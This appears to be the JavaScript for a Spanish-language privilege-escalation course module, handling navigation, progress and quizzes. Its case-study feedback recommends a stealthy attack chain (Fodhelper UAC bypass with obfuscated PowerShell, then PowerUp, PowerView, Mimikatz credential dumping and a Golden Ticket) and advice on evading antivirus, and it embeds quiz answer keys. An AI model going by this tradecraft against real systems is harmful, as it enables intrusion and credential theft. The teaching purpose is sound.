function loadTopic(topicId, topicIndex) {
    console.log(`[DEBUG] loadTopic called with topicId: ${topicId}, index: ${topicIndex}`);
    
    if (topicIndex < 0 || topicIndex >= moduleData.topics.length) {
        console.log(`[DEBUG] Invalid topic index ${topicIndex}, valid range: 0-${moduleData.topics.length - 1}`);
        return;
    }
    
    currentTopicIndex = topicIndex;
    const topic = moduleData.topics[topicIndex];
    
    console.log(`[DEBUG] Loading topic: ${topic.id} - ${topic.title}`);
    
    updateNavigationState();
    loadTopicContent(topic);
    updateProgress();
    
    console.log(`[DEBUG] Topic loaded successfully: currentTopicIndex = ${currentTopicIndex}`);
}

// Update navigation state
function updateNavigationState() {
    document.querySelectorAll('#module-nav .nav-item').forEach(item => {
        item.classList.remove('active');
    });
    
    const activeItem = document.querySelector(`#module-nav .nav-item[data-topic-index="${currentTopicIndex}"]`);
    if (activeItem) {
        activeItem.classList.add('active');
    }
}

// Load topic content
function loadTopicContent(topic) {
    console.log(`[DEBUG] loadTopicContent called for topic: ${topic.id}`);
    
    const contentContainer = document.getElementById('topic-content');
    if (!contentContainer) {
        console.log(`[DEBUG] ERROR: topic-content container not found`);
        return;
    }
    
    let content = '';
    
    switch (topic.id) {
        case 'escalamiento-horizontal':
            content = topicContents['escalamiento-horizontal'].content;
            break;
        case 'escalamiento-vertical':
            content = topicContents['escalamiento-vertical'].content;
            break;
        case 'herramientas-escalamiento':
            content = topicContents['herramientas-escalamiento'].content;
            break;
        default:
            content = createDefaultContent(topic);
    }
    
    contentContainer.innerHTML = content;
    
    setupTopicInteractions();
    
    // Fix icons immediately after content load
    if (window.IconFixSystem) {
        setTimeout(() => {
            window.IconFixSystem.fixAll();
        }, 50);
    }
    
    // Initialize diagrams for this topic
    setTimeout(() => {
        loadTopicDiagrams(topic.id);
    }, 100);
    
    console.log(`[DEBUG] Content loaded for topic: ${topic.id}`);
}

// Setup topic interactions
function setupTopicInteractions() {
    // Setup quiz buttons
    const quizButtons = document.querySelectorAll('.quiz-btn');
    quizButtons.forEach(btn => {
        btn.addEventListener('click', function() {
            const quizType = this.dataset.quiz;
            if (quizType === 'vertical') {
                checkVerticalQuizAnswers();
            } else if (quizType === 'tools') {
                checkToolsQuizAnswers();
            }
        });
    });
      // Setup case study buttons
    const caseStudyButtons = document.querySelectorAll('.case-study-btn');
    caseStudyButtons.forEach(btn => {
        btn.addEventListener('click', function() {
            const caseType = this.dataset.case;
            if (caseType === 'tools') {
                checkToolsCaseStudy();
            }
        });
    });
}

// Create default content for topics without specific content
function createDefaultContent(topic) {
    return `
        <div class="topic-header">
            <h2 class="text-center">
                <svg class="topic-icon me-2" width="32" height="32" viewBox="0 0 100 100">
                    <use href="../../assets/images/icons.svg#icon-privilege-escalation"></use>
                </svg>
                ${topic.title}
            </h2>
            <p class="topic-intro">
                Contenido del tema "${topic.title}" en desarrollo.
            </p>
        </div>

        <div class="topic-content-body">
            <div class="alert alert-info">
                <i class="fas fa-info-circle me-2"></i>
                <strong>Información:</strong> El contenido específico para este tema está en proceso de desarrollo.
            </div>
            
            <div class="concept-card">
                <h4>Subtemas incluidos:</h4>
                <ul class="list-group list-group-flush">
                    ${topic.subtopics.map(subtopic => `
                        <li class="list-group-item">
                            <i class="fas fa-chevron-right me-2 text-muted"></i>
                            ${subtopic}
                        </li>
                    `).join('')}
                </ul>
            </div>
            
            <div class="topic-actions mt-4">
                <button class="btn btn-sena-primary" onclick="completeTopic(${moduleData.topics.findIndex(t => t.id === topic.id)})">
                    <i class="fas fa-check me-2"></i>Marcar como Completado
                </button>
            </div>
        </div>
    `;
}

// Load first topic
function loadFirstTopic() {
    if (moduleData.topics.length > 0) {
        loadTopic(moduleData.topics[0].id, 0);
    }
}

// Show subtopic content
function showSubtopic(subtopicId) {
    console.log(`📑 Mostrando subtema: ${subtopicId}`);
    
    // Update subtopic navigation
    document.querySelectorAll('.topic-navigation .btn').forEach(btn => {
        btn.classList.remove('active');
    });
    
    event.target.classList.add('active');
    
    // Load subtopic content
    const subtopicContainer = document.getElementById('subtopic-content');
    const subtopicContent = subtopicContents[subtopicId];
    
    if (subtopicContent && subtopicContainer) {
        subtopicContainer.innerHTML = subtopicContent.content;
        
        // Initialize any diagrams in the subtopic
        setTimeout(() => {
            initializeSubtopicDiagrams(subtopicId);
        }, 100);
        
    } else {
        // Show placeholder for undeveloped content
        subtopicContainer.innerHTML = `
            <div class="escalation-card">
                <div class="escalation-card-header">
                    <i class="fas fa-construction me-2"></i>Contenido en Desarrollo
                </div>
                <div class="card-body">
                    <div class="content-placeholder text-center py-4">
                        <i class="fas fa-tools fa-3x text-muted mb-3"></i>
                        <h5 class="text-muted">Contenido Pendiente</h5>
                        <p class="text-muted">El contenido para este subtema está pendiente de desarrollo.</p>
                        <p class="small text-muted">ID: ${subtopicId}</p>
                    </div>
                </div>
            </div>
        `;
    }
}

// Load topic diagrams
function loadTopicDiagrams(topicId) {
    const diagrams = UNIVERSAL_DIAGRAM_SYSTEM.diagrams.filter(d => 
        d.title.toLowerCase().includes(topicId.replace('-', ' '))
    );
    
    diagrams.forEach(diagram => {
        const container = document.getElementById(diagram.id);
        if (container) {
            UNIVERSAL_DIAGRAM_SYSTEM.renderDiagram(diagram.id, diagram.id);
        }
    });
}

// Initialize subtopic diagrams
function initializeSubtopicDiagrams(subtopicId) {
    const diagramContainers = document.querySelectorAll('.diagram-container[id]');
    diagramContainers.forEach(container => {
        const diagramId = container.id;
        UNIVERSAL_DIAGRAM_SYSTEM.renderDiagram(diagramId, diagramId);
    });
}

// Update progress
function updateProgress() {
    const completedTopics = moduleData.topics.filter(topic => topic.completed).length;
    const totalTopics = moduleData.topics.length;
    const progressPercentage = (completedTopics / totalTopics) * 100;
    
    // Update progress bars
    const progressBars = document.querySelectorAll('.progress-bar');
    progressBars.forEach(bar => {
        bar.style.width = `${progressPercentage}%`;
    });
    
    // Update progress text
    const progressTexts = document.querySelectorAll('[id$="progress-text"]');
    progressTexts.forEach(text => {
        if (text.id.includes('sidebar')) {
            text.textContent = `${completedTopics} de ${totalTopics} temas completados`;
        } else {
            text.textContent = `${Math.round(progressPercentage)}%`;
        }
    });
    
    moduleProgress = progressPercentage;
}

// Setup event listeners
function setupEventListeners() {
    // Add any global event listeners here
    console.log('🎯 Event listeners configurados');
}

// Mark topic as completed
function markTopicCompleted(topicId) {
    const topic = moduleData.topics.find(t => t.id === topicId);
    if (topic) {
        topic.completed = true;
        updateProgress();
        loadModuleNavigation();
        console.log(`✅ Tema completado: ${topicId}`);
    }
}

// Complete topic (wrapper function for button clicks)
function completeTopic(topicIndex) {
    if (moduleData.topics[topicIndex]) {
        const topicId = moduleData.topics[topicIndex].id;
        markTopicCompleted(topicId);
        
        // Show completion message
        const alertHTML = `
            <div class="alert alert-success alert-dismissible fade show mt-3" role="alert">
                <i class="fas fa-check-circle me-2"></i>
                <strong>¡Tema completado!</strong> Has completado exitosamente "${moduleData.topics[topicIndex].title}".
                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
            </div>
        `;
        
        // Insert alert at the top of content
        const contentContainer = document.getElementById('topic-content');
        if (contentContainer) {
            contentContainer.insertAdjacentHTML('afterbegin', alertHTML);
        }
          // Auto-dismiss after 3 seconds and navigate to next topic if applicable
        setTimeout(() => {
            const alert = document.querySelector('.alert-success');
            if (alert) {
                alert.remove();
            }
            
            // Auto-navigation logic for sequential topics
            let shouldNavigate = false;
            let nextTopicIndex = -1;
            
            // If completing topic 1 (index 0), automatically navigate to topic 2 (index 1)
            if (topicIndex === 0 && moduleData.topics.length > 1) {
                shouldNavigate = true;
                nextTopicIndex = 1;
            }
            // If completing topic 2 (index 1), automatically navigate to topic 3 (index 2)
            else if (topicIndex === 1 && moduleData.topics.length > 2) {
                shouldNavigate = true;
                nextTopicIndex = 2;
            }
            
            if (shouldNavigate) {
                console.log(`📖 Navegando automáticamente al siguiente tema (${nextTopicIndex + 1})...`);
                const nextTopicId = moduleData.topics[nextTopicIndex].id;
                loadTopic(nextTopicId, nextTopicIndex);
                
                // Show navigation message
                setTimeout(() => {
                    const navigationAlert = `
                        <div class="alert alert-info alert-dismissible fade show mt-3" role="alert">
                            <i class="fas fa-arrow-right me-2"></i>
                            <strong>Navegación automática:</strong> Ahora puedes continuar con "${moduleData.topics[nextTopicIndex].title}".
                            <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                        </div>
                    `;
                    
                    const newContentContainer = document.getElementById('topic-content');
                    if (newContentContainer) {
                        newContentContainer.insertAdjacentHTML('afterbegin', navigationAlert);
                        
                        // Auto-dismiss navigation alert after 4 seconds
                        setTimeout(() => {
                            const navAlert = document.querySelector('.alert-info');
                            if (navAlert) {
                                navAlert.remove();
                            }
                        }, 4000);
                    }
                }, 500);
            }
        }, 3000);
    }
}

// ========================================
// QUIZ FUNCTIONALITY
// ========================================

// Check quiz answers function
function checkQuizAnswers() {
    const answers = {
        q1: 'b', // El horizontal se mueve entre sistemas, el vertical eleva privilegios
        q2: 'b', // Pass-the-Hash
        q3: 'c'  // Port scanning NO es técnica de persistencia
    };
    
    let score = 0;
    let totalQuestions = Object.keys(answers).length;
    let resultsHTML = '<div class="quiz-results-content">';
    
    // Check each question
    Object.keys(answers).forEach(questionId => {
        const selectedAnswer = document.querySelector(`input[name="${questionId}"]:checked`);
        const isCorrect = selectedAnswer && selectedAnswer.value === answers[questionId];
        
        if (isCorrect) {
            score++;
            resultsHTML += `<div class="quiz-result correct"><i class="fas fa-check-circle me-2"></i>Pregunta ${questionId.slice(1)}: Correcto</div>`;
        } else {
            resultsHTML += `<div class="quiz-result incorrect"><i class="fas fa-times-circle me-2"></i>Pregunta ${questionId.slice(1)}: Incorrecto</div>`;
        }
    });
    
    // Calculate percentage
    const percentage = Math.round((score / totalQuestions) * 100);
    
    // Add overall result
    resultsHTML += `<div class="quiz-score mt-3">`;
    if (percentage >= 80) {
        resultsHTML += `<div class="alert alert-success"><i class="fas fa-trophy me-2"></i><strong>¡Excelente!</strong> Has obtenido ${score}/${totalQuestions} respuestas correctas (${percentage}%)</div>`;
    } else if (percentage >= 60) {
        resultsHTML += `<div class="alert alert-warning"><i class="fas fa-star me-2"></i><strong>Bien hecho!</strong> Has obtenido ${score}/${totalQuestions} respuestas correctas (${percentage}%)</div>`;
    } else {
        resultsHTML += `<div class="alert alert-danger"><i class="fas fa-redo me-2"></i><strong>Necesitas repasar.</strong> Has obtenido ${score}/${totalQuestions} respuestas correctas (${percentage}%)</div>`;
    }
    resultsHTML += '</div></div>';
    
    // Display results
    const resultsContainer = document.getElementById('quiz-results');
    resultsContainer.innerHTML = resultsHTML;
    resultsContainer.style.display = 'block';
    
    // Update progress if score is good
    if (percentage >= 70) {
        markTopicCompleted('escalamiento-horizontal');
    }
}

// Check quiz answers for vertical escalation
function checkVerticalQuizAnswers() {
    const answers = {
        q_vertical_1: 'b', // WinPEAS y LinPEAS para diferentes sistemas operativos
        q_vertical_2: 'b'  // Fodhelper UAC Bypass utiliza el registro
    };
    
    let score = 0;
    let totalQuestions = Object.keys(answers).length;
    let resultsHTML = '<div class="quiz-results-content">';
    
    // Check each question
    Object.keys(answers).forEach(questionId => {
        const selectedAnswer = document.querySelector(`input[name="${questionId}"]:checked`);
        const isCorrect = selectedAnswer && selectedAnswer.value === answers[questionId];
        
        if (isCorrect) {
            score++;
            resultsHTML += `<div class="quiz-result correct"><i class="fas fa-check-circle me-2"></i>Pregunta ${questionId.replace('q_vertical_', '')}: Correcto</div>`;
        } else {
            resultsHTML += `<div class="quiz-result incorrect"><i class="fas fa-times-circle me-2"></i>Pregunta ${questionId.replace('q_vertical_', '')}: Incorrecto</div>`;
        }
    });
    
    // Calculate percentage
    const percentage = Math.round((score / totalQuestions) * 100);
    
    // Add overall result
    resultsHTML += `<div class="quiz-score mt-3">`;
    if (percentage >= 80) {
        resultsHTML += `<div class="alert alert-success"><i class="fas fa-trophy me-2"></i><strong>¡Excelente!</strong> Has obtenido ${score}/${totalQuestions} respuestas correctas (${percentage}%)</div>`;
    } else if (percentage >= 60) {
        resultsHTML += `<div class="alert alert-warning"><i class="fas fa-star me-2"></i><strong>Bien hecho!</strong> Has obtenido ${score}/${totalQuestions} respuestas correctas (${percentage}%)</div>`;
    } else {
        resultsHTML += `<div class="alert alert-danger"><i class="fas fa-redo me-2"></i><strong>Necesitas repasar.</strong> Has obtenido ${score}/${totalQuestions} respuestas correctas (${percentage}%)</div>`;
    }
    resultsHTML += '</div></div>';
    
    // Display results
    const resultsContainer = document.getElementById('vertical-quiz-results');
    if (!resultsContainer) {
        // Create results container if it doesn't exist
        const quizContainer = document.querySelector('.topic-quiz');
        if (quizContainer) {
            const newResultsContainer = document.createElement('div');
            newResultsContainer.id = 'vertical-quiz-results';
            newResultsContainer.className = 'quiz-results mt-3';
            newResultsContainer.style.display = 'none';
            quizContainer.appendChild(newResultsContainer);
            newResultsContainer.innerHTML = resultsHTML;
            newResultsContainer.style.display = 'block';
        }
    } else {
        resultsContainer.innerHTML = resultsHTML;
        resultsContainer.style.display = 'block';
    }
    
    // Update progress if score is good
    if (percentage >= 70) {
        markTopicCompleted('escalamiento-vertical');
    }
}

// Handle case study interactions
function handleCaseStudy(caseId, selectedValue) {
    const feedbackContainer = document.getElementById(`case-${caseId}-feedback`);
    if (!feedbackContainer) return;
    
    let feedbackHTML = '';
    let isCorrect = false;
    
    switch (caseId) {
        case 'q_vertical_case':
            if (selectedValue === 'b') {
                isCorrect = true;
                feedbackHTML = `
                    <div class="alert alert-success mt-3">
                        <i class="fas fa-check-circle me-2"></i>
                        <strong>¡Correcto!</strong> Fodhelper UAC bypass con PowerShell ofuscado es la opción más discreta. 
                        Utiliza un binario legítimo del sistema y puede evadir muchas soluciones de seguridad cuando se combina con ofuscación.
                        <br><br>
                        <strong>¿Por qué las otras opciones no son ideales?</strong>
                        <ul class="mt-2 mb-0">
                            <li><strong>Opción A:</strong> WinPEAS puede ser detectado por antivirus y generar muchos logs de auditoría.</li>
                            <li><strong>Opción C:</strong> EternalBlue es muy antiguo, ruidoso y fácilmente detectable por sistemas modernos.</li>
                        </ul>
                    </div>
                `;
            } else if (selectedValue === 'a') {
                feedbackHTML = `
                    <div class="alert alert-warning mt-3">
                        <i class="fas fa-exclamation-triangle me-2"></i>
                        <strong>No es la mejor opción.</strong> Aunque WinPEAS es muy útil para enumeración, puede ser detectado por Windows Defender y generar alertas en los logs de seguridad. En un entorno con defensas activas, es mejor usar métodos más sigilosos primero.
                    </div>
                `;
            } else if (selectedValue === 'c') {
                feedbackHTML = `
                    <div class="alert alert-danger mt-3">
                        <i class="fas fa-times-circle me-2"></i>
                        <strong>Incorrecto.</strong> EternalBlue (MS17-010) es un exploit muy antiguo que no funcionaría en Windows 10 parcheado. Además, es extremadamente ruidoso y fácilmente detectable por cualquier sistema de monitoreo moderno.
                    </div>
                `;
            }
            break;
    }
    
    feedbackContainer.innerHTML = feedbackHTML;
    feedbackContainer.style.display = 'block';
    
    // Update case study buttons
    const caseButtons = document.querySelectorAll(`[data-case="${caseId}"]`);
    caseButtons.forEach(btn => {
        btn.classList.remove('btn-outline-primary', 'btn-success', 'btn-danger');
        if (btn.dataset.value === selectedValue) {
            btn.classList.add(isCorrect ? 'btn-success' : 'btn-danger');
        } else {
            btn.classList.add('btn-outline-primary');
        }
    });
}

// Check quiz answers for tools topic
function checkToolsQuizAnswers() {
    const answers = {
        q_tools_1: 'b', // sekurlsa::logonpasswords para extraer passwords de memoria
        q_tools_2: 'b', // PowerUp se especializa en escalamiento de privilegios
        q_tools_3: 'b'  // Hacer backup de sethc.exe es el primer paso
    };
    
    let score = 0;
    let totalQuestions = Object.keys(answers).length;
    let resultsHTML = '<div class="quiz-results-content">';
    
    // Check each question
    Object.keys(answers).forEach(questionId => {
        const selectedAnswer = document.querySelector(`input[name="${questionId}"]:checked`);
        const isCorrect = selectedAnswer && selectedAnswer.value === answers[questionId];
        
        if (isCorrect) {
            score++;
            resultsHTML += `<div class="quiz-result correct"><i class="fas fa-check-circle me-2"></i>Pregunta ${questionId.replace('q_tools_', '')}: Correcto</div>`;
        } else {
            resultsHTML += `<div class="quiz-result incorrect"><i class="fas fa-times-circle me-2"></i>Pregunta ${questionId.replace('q_tools_', '')}: Incorrecto</div>`;
        }
    });
    
    // Calculate percentage
    const percentage = Math.round((score / totalQuestions) * 100);
    
    // Add overall result
    resultsHTML += `<div class="quiz-score mt-3">`;
    if (percentage >= 80) {
        resultsHTML += `<div class="alert alert-success"><i class="fas fa-trophy me-2"></i><strong>¡Excelente!</strong> Has obtenido ${score}/${totalQuestions} respuestas correctas (${percentage}%)</div>`;
    } else if (percentage >= 60) {
        resultsHTML += `<div class="alert alert-warning"><i class="fas fa-star me-2"></i><strong>Bien hecho!</strong> Has obtenido ${score}/${totalQuestions} respuestas correctas (${percentage}%)</div>`;
    } else {
        resultsHTML += `<div class="alert alert-danger"><i class="fas fa-redo me-2"></i><strong>Necesitas repasar.</strong> Has obtenido ${score}/${totalQuestions} respuestas correctas (${percentage}%)</div>`;
    }
    resultsHTML += '</div></div>';
    
    // Display results
    let resultsContainer = document.getElementById('tools-quiz-results');
    if (!resultsContainer) {
        // Create results container if it doesn't exist
        const quizContainer = document.querySelector('.topic-quiz');
        if (quizContainer) {
            const newResultsContainer = document.createElement('div');
            newResultsContainer.id = 'tools-quiz-results';
            newResultsContainer.className = 'quiz-results mt-3';
            newResultsContainer.style.display = 'none';
            quizContainer.appendChild(newResultsContainer);
            resultsContainer = newResultsContainer;
        }
    }
    
    if (resultsContainer) {
        resultsContainer.innerHTML = resultsHTML;
        resultsContainer.style.display = 'block';
    }
    
    // Update progress if score is good
    if (percentage >= 70) {
        markTopicCompleted('herramientas-escalamiento');
    }
}

// Handle tools case study interactions
function handleToolsCaseStudy(caseId, selectedValue) {
    const feedbackContainer = document.getElementById(`case-${caseId}-feedback`);
    if (!feedbackContainer) return;
    
    let feedbackHTML = '';
    let isCorrect = false;
    
    switch (caseId) {
        case 'q_tools_case':
            if (selectedValue === 'b') {
                isCorrect = true;
                feedbackHTML = `
                    <div class="alert alert-success mt-3">
                        <i class="fas fa-check-circle me-2"></i>
                        <strong>¡Correcto!</strong> Esta es la secuencia más efectiva y sigilosa:
                        <br><br>
                        <strong>1. PowerUp:</strong> Enumera configuraciones incorrectas sin ser detectado por antivirus.
                        <br><strong>2. PowerView:</strong> Mapea el dominio para identificar objetivos de alto valor.
                        <br><strong>3. Mimikatz:</strong> Extrae credenciales de memoria una vez elevados los privilegios locales.
                        <br><strong>4. Golden Ticket:</strong> Proporciona persistencia total en el dominio.
                        <br><br>
                        Esta secuencia es sigilosa, efectiva y minimiza la detección por usar herramientas PowerShell que pueden evadir AV.
                    </div>
                `;
            } else if (selectedValue === 'a') {
                feedbackHTML = `
                    <div class="alert alert-warning mt-3">
                        <i class="fas fa-exclamation-triangle me-2"></i>
                        <strong>Puede funcionar, pero no es óptima.</strong> Empezar directamente con Mimikatz sin elevar privilegios primero es arriesgado y puede ser detectado por Windows Defender. Además, John The Ripper sería lento para un entorno donde el tiempo es crítico.
                    </div>
                `;
            } else if (selectedValue === 'c') {
                feedbackHTML = `
                    <div class="alert alert-danger mt-3">
                        <i class="fas fa-times-circle me-2"></i>
                        <strong>No es la mejor opción.</strong> Metasploit es muy ruidoso y fácilmente detectable por sistemas de monitoreo modernos. Los exploits locales pueden no funcionar en un Windows 2019 parcheado, y Meterpreter genera muchas alertas en entornos monitorizados.
                    </div>
                `;
            }
            break;
    }
    
    feedbackContainer.innerHTML = feedbackHTML;
    feedbackContainer.style.display = 'block';
    
    // Update case study buttons
    const caseButtons = document.querySelectorAll(`[data-case="${caseId}"]`);
    caseButtons.forEach(btn => {
        btn.classList.remove('btn-outline-primary', 'btn-success', 'btn-danger');
        if (btn.dataset.value === selectedValue) {
            btn.classList.add(isCorrect ? 'btn-success' : 'btn-danger');
        } else {
            btn.classList.add('btn-outline-primary');
        }
    });
}

// ========================================
// INITIALIZATION
// ========================================

// Initialize when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    console.log('🌟 DOM cargado, inicializando módulo...');
    initializeModule();
    
    // Initialize Universal Diagram System
    UNIVERSAL_DIAGRAM_SYSTEM.init();
});

// Initialize module immediately if DOM is already loaded
if (document.readyState === 'loading') {
    // DOM not ready yet
    console.log('⏳ Esperando carga del DOM...');
} else {
    // DOM is ready
    console.log('🌟 DOM ya cargado, inicializando módulo...');
    initializeModule();
    
    // Initialize Universal Diagram System
    UNIVERSAL_DIAGRAM_SYSTEM.init();
}

console.log('📚 Módulo Escalamiento de Privilegios cargado');
